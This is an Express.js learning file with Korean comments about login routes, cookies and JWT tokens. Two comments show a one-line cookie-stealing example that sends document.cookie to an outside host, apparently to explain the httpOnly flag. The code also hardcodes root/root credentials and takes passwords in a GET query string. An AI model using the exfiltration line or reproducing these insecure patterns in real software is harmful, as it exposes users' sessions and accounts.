const express= require('express');
const app = express();
let token = require('./server')//외부 js파일 가져오기
const cookieParser = require('cookie-parser');
const nunjucks = require('nunjucks');
const bodyParser = require('body-parser');
const ctoken = require('./jwt');
const auth = require('./middleware/auth'); // arrow function;

app.set('view engine','html');
nunjucks.configure('views',{
    express:app,
})


app.use(express.json());
app.use(express.static('public'));

app.use(express.urlencoded({extended:false}));
app.use(cookieParser());

app.get('/',(req,res)=>{


    let {msg:message}=req.query;
    
    console.log(message);
    res.render('index')
    //res.send(`${msg} hello world<a href="/menu1">menu1</a><a href="/login?id=root&pw=root">로그인</a>`);
        /*
        body:{
            'hello world!'
        }
         */
})
//res.sendsk res.render는 둘 다 결국 응답메세지를 완성시켜서 보내주는 것.
//send는 body 영역을 그 안에 들어가있는 string을 넣어주는 것.

//브라우저에 document.n=qur
app.get('/login',(req,res)=>{
    let {id,pw} = req.query;//비구조 할당문 사용시 let, const 변수선언문이 꼭 필요합니다.
                            //혹시 사용할 이유가 없다면 ()안으로 사용해주셔야 합니다.
    if(id =='root' && pw =='root'){
        //토큰 생성
        let ctoken = token();
        //cookie 값은 key:value형식
        res.cookie('token',ctoken,{httpOnly:true,secure:true,});
        //location.href=`http://naver.com?${document.cookie}`이런식으로 가로챌 수 있음.
        //응답을 받았을 때 값이 생김
        res.redirect('/?msg=로그인성공');
        //location.href=`http://naver.com?${document.cookie}`가로채기 가능
    }else{
        //토큰 실패
        res.redirect('/?msg=로그인실패');
    }
                        })

app.get('/user/info', auth, (req, res)=>{ // auth가 먼저 실행됨
    res.send(`hello ${req.userid}`);
})

app.get('/menu1',(req,res)=>{
    console.log(req.cookies);
    res.send('menu1page');
})


app.post('/auth/local/login',(req, res)=>{
    let {userid, userpw} = req.body;
    // let {userid2, userpw2} = JSON.parse(req.get('data')); // get은 headers의 속성을 가져올 수 있다
    console.log('body req:' , userid, userpw);                  //가져와서 JSON.parse()
    // console.log('data:' , userid2, userpw2);
    let result = {};
    if(userid == 'root'&&userpw=='root'){
        result={
            result : true,
            msg:'로그인 성공'
        }
        let token = ctoken();
        res.cookie('AccessToken' , token, {httpOnly:true, secure:true,})
    }else{
        result={
            result:false,
            msg:'아이디와 패스워드를 확인해주세요'
        }
    }
    res.json(result)
})


app.listen(3000, ()=>{
    console.log('server 3000');
})